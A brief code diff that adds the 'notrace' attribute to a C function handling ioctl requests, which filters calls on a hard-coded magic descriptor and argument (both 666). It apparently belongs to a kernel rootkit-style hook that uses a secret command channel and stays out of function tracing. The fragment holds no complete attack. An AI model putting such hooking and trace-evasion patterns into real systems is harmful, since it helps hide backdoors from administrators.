@@ -8,7 +8,7 @@
 unsigned int service_fd = 666;
 unsigned long ping_arg = 666;
 
-int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
+notrace int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
 {
     // 0 means this is not a service request
     if (fd != service_fd)
